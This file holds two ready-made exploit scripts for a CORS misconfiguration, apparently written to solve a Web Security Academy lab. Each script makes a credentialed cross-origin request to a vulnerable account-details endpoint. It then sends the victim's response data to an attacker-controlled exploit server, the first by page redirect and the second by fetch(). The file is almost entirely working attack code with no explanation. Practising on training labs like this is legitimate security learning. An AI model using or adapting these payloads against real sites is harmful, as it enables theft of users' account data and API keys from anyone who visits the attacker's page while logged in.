<!-- ----------------------- Data Exfiltration To our Server via cors using XHR  ----------------------------- -->


<!-- Data Exfiltration using location -->
<!-- attacker server = https://exploit-ac5e1f871eff47b4c0792dbf01370018.web-security-academy.net/log-->
<!-- Vulnerable Endpoint = https://acb41f971eb847c3c0de2da500830064.web-security-academy.net/accountDetails -->

<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://acb41f971eb847c3c0de2da500830064.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://exploit-ac5e1f871eff47b4c0792dbf01370018.web-security-academy.net/log?key='+encodeURIComponent(this.responseText);
  };
</script>">




<!-- Data Exfiltration using fetch() -->
<!-- attacker server = https://exploit-ac5e1f871eff47b4c0792dbf01370018.web-security-academy.net/log-->
<!-- Vulnerable Endpoint = https://acb41f971eb847c3c0de2da500830064.web-security-academy.net/accountDetails -->

<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
    fetch('https://exploit-ac5e1f871eff47b4c0792dbf01370018.web-security-academy.net/log?key='+encodeURIComponent(this.responseText))
  };
  req.open('get','https://acb41f971eb847c3c0de2da500830064.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  
</script>">